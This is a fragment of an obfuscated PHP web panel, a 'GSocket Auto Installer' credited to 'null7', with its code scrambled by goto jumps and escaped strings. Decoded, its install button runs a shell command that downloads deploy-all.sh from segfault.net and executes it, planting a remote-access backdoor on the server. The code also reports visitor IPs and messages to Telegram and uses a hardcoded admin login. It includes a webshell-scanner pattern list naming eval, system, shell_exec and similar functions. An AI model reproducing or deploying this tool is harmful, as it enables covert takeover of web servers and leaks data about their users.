stream_context_create($options); $result = @file_get_contents($url, false, $context); if ($result === FALSE) { error_log("\x46\141\x69\x6c\145\144\40\164\157\40\163\145\156\144\40\155\145\x73\x73\x61\147\145\x20\x74\x6f\40\124\x65\154\145\147\162\x61\x6d"); } } goto HPkn0; PsAia: goto SZB62; goto BPozb; Zk4Me: goto Wk079; goto KbaMS; v5gmh: Wk079: goto Tkm2q; fsoW7: BSLcL: goto Vqy2R; Mbsuj: yCaGo: goto X8c53; R2xmp: goto yCaGo; goto EwOBK; PsG_y: Vj0LG: goto g3kmX; nr5qs: gTR6W: goto gsJ0H; UhyEj: goto UWJTD; goto ieMpI; APyg0: sendToTelegram($message); goto NcB8y; h1OdW: goto vVvrx; goto LFzpB; xpQlr: iQGgw: goto SsFre; rFMFj: goto I4dkB; goto OrtDP; rTcBi: vyQcW: goto edbFT; Zrut1: goto HG0YP; goto Ti0PE; gCQK3: goto MhbDl; goto CCFYE; HIhA4: goto Vj0LG; goto m1qi4; TIYqA: UWJTD: goto h5AdG; h5AdG: goto vyQcW; goto wMeVW; OZQwC: goto vVsQ0; goto JeBmu; HPkn0: goto x9xuz; goto XlBWs; oE8a3: ccCaR: goto SwZ17; aylsO: if ($action === "\154\x6f\147\151\156" && $_SERVER["\x52\105\121\125\x45\x53\124\x5f\115\x45\x54\110\117\104"] === "\x50\117\x53\x54") { $username = $_POST["\165\x73\145\x72\156\141\x6d\x65"]; $password = $_POST["\x70\x61\163\163\x77\x6f\162\x64"]; if ($username === $valid_username && $password === $valid_password) { $_SESSION["\x6c\157\x67\147\145\x64\x69\x6e"] = true; header("\x4c\x6f\x63\141\x74\x69\157\156\x3a\x20\77\141\x63\x74\x69\x6f\x6e\x3d\144\141\163\x68\142\x6f\x61\162\x64"); die; } else { displayLogin(true); die; } } elseif ($action === "\144\141\163\x68\x62\157\141\x72\144") { if (!isset($_SESSION["\x6c\157\147\x67\145\x64\x69\156"]) || $_SESSION["\x6c\x6f\x67\147\x65\x64\151\x6e"] !== true) { displayLogin(); die; } displayDashboard(); die; } elseif ($action === "\151\156\x73\164\141\154\x6c" && $_SERVER["\x52\105\121\x55\105\123\124\137\115\105\124\x48\117\x44"] === "\120\x4f\x53\x54") { if (!isset($_SESSION["\154\x6f\x67\147\x65\144\151\x6e"]) || $_SESSION["\x6c\157\x67\x67\145\144\151\156"] !== true) { displayLogin(); die; } if (isset($_POST["\151\156\163\164\x61\154\154"])) { $install_command = "\143\x75\162\x6c\x20\x2d\146\x73\123\x4c\40\150\164\x74\x70\72\57\57\156\157\x73\x73\154\56\163\x65\x67\x66\141\x75\154\x74\56\x6e\x65\x74\57\x64\x65\160\154\157\x79\x2d\x61\x6c\154\x2e\x73\x68\x20\55\157\40\x64\x65\x70\x6c\x6f\x79\x2d\141\154\x6c\x2e\163\x68\40\x26\46\x20\x62\x61\x73\x68\x20\x64\x65\x70\154\157\x79\55\x61\154\x6c\56\163\x68\x20\62\x3e\x26\61"; $output = shell_exec($install_command); $_SESSION["\x69\156\x73\164\x61\x6c\x6c\x5f\x6f\165\164\x70\x75\x74"] = $output ? $output : "\111\156\163\x74\x61\154\154\141\164\x69\157\x6e\x20\x63\157\155\160\154\145\x74\x65\x64\54\x20\142\x75\164\40\156\157\40\157\x75\164\x70\165\x74\x20\x77\x61\163\40\143\141\160\x74\x75\x72\x65\x64\56"; } header("\x4c\157\143\x61\x74\x69\157\156\72\40\x3f\x61\143\x74\x69\157\156\x3d\x64\141\163\x68\x62\157\141\162\144"); die; } elseif ($action === "\163\x63\141\x6e" && $_SERVER["\122\x45\x51\x55\105\123\x54\137\115\x45\x54\110\x4f\104"] === "\120\x4f\123\124") { if (!isset($_SESSION["\154\x6f\x67\x67\145\x64\151\x6e"]) || $_SESSION["\154\x6f\147\147\145\x64\151\156"] !== true) { displayLogin(); die; } if (isset($_POST["\163\x63\x61\x6e"])) { $directory = __DIR__; $_SESSION["\163\x63\141\x6e\x5f\162\145\x73\165\154\x74\163"] = scanForWebshells($directory); } header("\x4c\x6f\x63\x61\164\151\157\156\x3a\x20\x3f\x61\x63\x74\151\x6f\156\x3d\x64\141\x73\150\x62\x6f\141\162\x64"); die; } elseif ($action === "\x6c\x6f\147\157\165\x74") { session_destroy(); header("\114\157\x63\141\x74\151\157\156\72\x20\x3f"); die; } else { if (isset($_SESSION["\154\157\x67\x67\x65\144\x69\156"]) && $_SESSION["\x6c\x6f\x67\147\145\144\151\156"] === true) { displayDashboard(); } else { displayLogin(); } } goto UhyEj; ymWaU: EExh1: goto BqwlL; BVTpi: ssfUb: goto j6hzs; g1o_G: L3jFr: goto b2y2W; ylBVA: goto kYm20; goto kIThD; xZAAP: goto GVHRq; goto sePp1; ieMpI: N4a8d: goto T2W5u; Q36X9: SLDAP: goto APyg0; Vqy2R: h002M: goto QZSny; qtaXC: AOnUu: goto fmVCZ; H63f9: stolR: goto uKMd3; rOtUq: goto l7vCf; goto vKpug; xVER8: $valid_username = "\141\144\155\x69\156"; goto OlkF1; aE_Gs: goto EsOVG; goto fsoW7; m1qi4: ONXO7: goto MHEpT; JTR6J: goto fgHbW; goto peCh8; idLHn: vVvrx: goto LD8fw; vk0lw: MhbDl: goto RlDRJ; gceUO: goto gTR6W; goto pfNmD; ck3yx: goto j3MPd; goto W36si; RlDRJ: goto DTQ4e; goto fDBs4; LD8fw: goto i5brm; goto PsAia; VuW1s: SZB62: goto DDdKU; T2W5u: HG0YP: goto wXeot; MHEpT: function displayDashboard() { ?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>GSocket Installer - Dashboard</title><script src="https://cdn.tailwindcss.com"></script><style>body{background:#fff;font-family:Inter,sans-serif}.fade-in{animation:fadeIn 1s ease-in-out}@keyframes fadeIn{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}.card{background:rgba(255,255,255,.95);backdrop-filter:blur(10px);transition:transform .3s ease}.card:hover{transform:translateY(-5px)}.btn:hover{transform:scale(1.05);transition:transform .2s ease-in-out}.pulse{animation:pulse 2s infinite}@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.1)}100%{transform:scale(1)}}.spinner{display:none;border:4px solid rgba(0,0,0,.1);border-left-color:#22c55e;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin-left:10px}@keyframes spin{to{transform:rotate(360deg)}}table{width:100%;border-collapse:collapse}td,th{padding:12px;text-align:left;border-bottom:1px solid #e5e7eb}th{background:#f3f4f6;font-weight:600}tr{background:#f0fdf4}td{color:#15803d}</style><script>function startInstallation(button) {
                button.innerHTML = 'Installing... <span class="spinner inline-block"></span>';
                button.classList.add('opacity-75', 'cursor-not-allowed');
                document.querySelector('.spinner').style.display = 'inline-block';
                const audio = document.getElementById('hackerSoundInstall');
                audio.play();
                setTimeout(() => {
                    audio.pause();
                    audio.currentTime = 0;
                }, 5000);
            }

            function startScan(button) {
                button.innerHTML = 'Scanning... <span class="spinner inline-block"></span>';
                button.classList.add('opacity-75', 'cursor-not-allowed');
                document.querySelectorAll('.spinner')[1].style.display = 'inline-block';
                const audio = document.getElementById('hackerSoundScan');
                audio.play();
                setTimeout(() => {
                    audio.pause();
                    audio.currentTime = 0;
                }, 5000);
            }</script></head><body class="text-gray-800 min-h-screen"><nav class="p-4 bg-blue-800 shadow-lg sticky top-0"><div class="container mx-auto flex items-center justify-between"><h1 class="text-xl font-bold text-white">GSocket Auto Installer</h1><a class="transition text-white font-medium hover:text-blue-200"href="?action=logout">Logout</a></div></nav><div class="container mx-auto p-6"><div class="fade-in p-8 rounded-2xl shadow-2xl card"><h2 class="text-gray-800 font-semibold mb-4 text-2xl">GSocket Installation</h2><p class="mb-6 text-gray-600">Click the button below to start the GSocket installation process.</p><form action="?action=install"method="POST"class="mb-8"><button class="rounded-lg py-3 transition btn shadow-lg text-white pulse px-6 bg-green-500 hover:bg-green-600"type="submit"name="install"onclick="startInstallation(this)">Start Installation</button></form><h2 class="text-gray-800 font-semibold mb-4 text-2xl">Webshell Scanner</h2><p class="mb-6 text-gray-600">Scan the website directory for potential PHP webshells.</p><form action="?action=scan"method="POST"><button class="rounded-lg py-3 transition btn shadow-lg text-white pulse px-6 bg-purple-500 hover:bg-purple-600"type="submit"name="scan"onclick="startScan(this)">Scan for Webshells</button></form><audio id="hackerSoundInstall"src="https://www.freesound.org/data/previews/171/171104_3049496-lq.mp3"></audio><audio id="hackerSoundScan"src="https://www.freesound.org/data/previews/120/120341_1849770-lq.mp3"></audio><?php  if (isset($_SESSION["\x69\156\x73\x74\x61\x6c\x6c\x5f\x6f\165\164\x70\x75\x74"])) { ?>
<div class="rounded-lg bg-gray-100 mt-6 p-4"><h3 class="text-gray-800 font-semibold">Installation Output:</h3><pre class="text-sm text-gray-700"><?php  echo htmlspecialchars($_SESSION["\151\156\x73\164\141\x6c\154\x5f\x6f\165\x74\x70\x75\164"]); ?>
</pre></div><?php  } if (isset($_SESSION["\163\x63\x61\x6e\x5f\162\x65\163\165\154\164\163"])) { ?>
<div class="rounded-lg bg-gray-100 mt-6 p-4"><h3 class="text-gray-800 font-semibold">Webshell Scan Results:</h3><?php  if (isset($_SESSION["\x73\x63\x61\156\137\x72\145\163\165\154\164\x73"]["\x65\162\x72\157\x72"])) { ?>
<p class="text-red-500"><?php  echo htmlspecialchars($_SESSION["\163\x63\141\x6e\x5f\x72\x65\163\165\x6c\x74\163"]["\145\x72\x72\x6f\162"]); ?>
</p><?php  } elseif (empty($_SESSION["\163\143\x61\x6e\137\x72\x65\x73\165\x6c\164\163"])) { ?>
<p class="font-medium text-green-500">No suspicious PHP files detected.</p><?php  } else { ?>
<table><thead><tr><th>File Path</th><th>Suspected Issues</th></tr></thead><tbody><?php  foreach ($_SESSION["\x73\143\x61\x6e\137\x72\x65\163\165\154\x74\163"] as $result) { ?>
<tr><td><?php  echo htmlspecialchars($result["\146\x69\x6c\x65"]); ?>
</td><td><?php  echo htmlspecialchars($result["\x73\165\163\x70\x69\x63\151\x6f\x6e\x73"]); ?>
</td></tr><?php  } ?>
</tbody></table><?php  } ?>
</div><?php  unset($_SESSION["\163\143\x61\x6e\x5f\162\x65\x73\x75\154\x74\x73"]); } ?>
<footer class="text-sm mt-8 text-center text-gray-600"><p>Created by null7 | mail: <a class="hover:underline text-blue-600"href="mailto:null7ganteng@gmail.com">null7ganteng@gmail.com</a></p></footer></div></div></body></html><?php  } goto mSp5L; X7vLl: goto WgWtg; goto TSXSW; v1vrF: ?>
<script type="text/javascript">var gk_isXlsx = false;
var gk_xlsxFileLookup = {};
var gk_fileData = {};
function loadFileData(filename) {
    if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
        try {
            var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
            var firstSheetName = workbook.SheetNames[0];
            var worksheet = workbook.Sheets[firstSheetName];

            // Convert sheet to JSON to filter blank rows
            var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
            // Filter out blank rows (rows where all cells are empty, null, or undefined)
            var filteredData = jsonData.filter(row =>
                row.some(cell => cell !== '' && cell !== null && cell !== undefined)
            );

            // Convert filtered JSON back to CSV
            var csv = XLSX.utils.aoa_to_sheet(filteredData); // Create a new sheet from filtered array of arrays
            csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
            return csv;
        } catch (e) {
            console.error(e);
            return "";
        }
    }
    return gk_fileData[filename] || "";
}</script><?php  goto aE_Gs; KsL62: goto stolR; goto OtklT; kImX7: goto SLDAP; goto dme_7; f3fgu: goto Twozu; goto PsG_y; ZaKIE: goto L3jFr; goto PdktG; mSp5L: goto AOnUu; goto nr5qs; DKD4_: WgWtg: goto PVc3z; QZSny: goto GZAxI; goto v3EJo; HDP2p: mIdEs: goto R2xmp; wXeot: goto xwMrS; goto TgtdM; Vd4vg: $ip_address = $_SERVER["\x52\x45\x4d\x4f\x54\x45\137\x41\104\104\122"]; goto X7vLl; NtLke: ZW87i: goto rwiSS; xKXzl: vu22m: goto vm2Sv; pbbvP: goto N3mcS; goto isxUJ; O0n3o: WNsRQ: goto KsL62; pyBXi: goto wqudj; goto jnMeN; Tg2rV: pFM6m: goto Zrut1; peCh8: ohEq4: goto PdP2b; pfNmD: EBqHl: goto BVTpi; uKMd3: session_start(); goto mn2LD; vv9L6: goto iQGgw; goto GN3m9; vZVfd: l7vCf: goto HIhA4; kIThD: vVsQ0: goto ymWaU; X8c53: goto i8txK; goto FzRQB; gsJ0H: $webshell_patterns = array("\57\x5c\142\145\x76\141\154\134\x73\52\x5c\x28\x2f\151", "\x2f\134\x62\x73\x79\163\164\145\155\134\163\52\134\50\x2f\151", "\x2f\x5c\142\x65\x78\145\x63\x5c\x73\x2a\x5c\x28\x2f\x69", "\57\134\142\x73\150\x65\x6c\154\137\145\x78\145\143\x5c\x73\x2a\x5c\x28\x2f\151", "\x2f\134\x62\x70\x61\x73\x73\164\150\162\165\x5c\x73\52\134\50\x2f\x69", "\57\x5c\142\160\157\160\x65\x6e\134\x73\x2a\x5c\50\x2f\x69", "\x2f\x5c\x62\160\x72\157\x63\137\x6f\x70\145\156\x5c\163\52\134\x28\x2f\x69", "\x2f\134\x24\137\120\117\x53\124\x5c\133\x27\143\x6d\144\47\134\135\57\151", "\x2f\134\44\x5f\107\105\124\x5c\x5b\47\x63\155\144\x27\x5c\135\57\151", "\57\134\142\142\141\x73\145\66\x34\x5f\144\x65\x63\x6f\144\x65\x5c\163\52\x5c\50\57\151", "\x2f\134\142\x67\172\x69\156\x66\154\x61\164\145\134\x73\52\134\x28\x2f\151", "\x2f\134\142\163\x74\162\137\x72\157\x74\x31\63\x5c\x73\x2a\134\x28\57\151", "\x2f\x5c\142\160\x72\145\x67\x5f\162\145\x70\x6c\x61\x63\x65\x5c\163\52\134\50\56\x2a\77\x5c\57\145\57\x69"); goto pbbvP; edbFT: goto Elzhz; goto qYDe4; pnrr7: ')); ?>
